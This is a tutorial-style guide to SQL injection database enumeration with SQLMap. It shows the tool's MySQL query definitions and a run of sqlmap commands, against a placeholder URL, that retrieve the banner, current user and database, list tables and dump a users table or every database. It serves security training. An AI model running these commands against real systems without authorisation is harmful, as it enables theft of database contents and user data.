# Database Enumeration

Enumeration is the central part of an SQL injection attack, performed after successfully detecting and confirming exploitability of the SQLi vulnerability. It involves lookup and retrieval of all available information from the vulnerable database.

## SQLMap Data Exfiltration

SQLMap uses predefined queries for all supported DBMSes, defined in `queries.xml`. Each entry contains the SQL needed to retrieve specific content. For example, MySQL queries include:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <dbms value="MySQL">
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1"/>
        </users>
    </dbms>
</root>
```

**Query Types:**
- **Inband**: Used for non-blind SQLi (UNION-query, error-based) where results appear in the response
- **Blind**: Used for blind SQLi where data is retrieved row-by-row, column-by-column, bit-by-bit

## Basic DB Enumeration

Start with retrieving basic information:

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

**Output Example:**
- Banner: `5.1.41-3~bpo50+1`
- Current user: `root@%`
- Current database: `testdb`
- DBA: `True`

> **Note:** DB `root` user typically has no relation to OS `root` and represents only DBMS privilege level.

## Table Enumeration

### List Tables
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

### Dump Table
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

## Table/Row Enumeration

### Specific Columns Only
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

### Specific Rows
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration

### WHERE Condition
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full Database Enumeration

### All Tables in Database
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

### All Databases (Exclude System DBs)
```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

**Tip:** Use `--dump-format=HTML` or `--dump-format=SQLite` for alternative output formats.
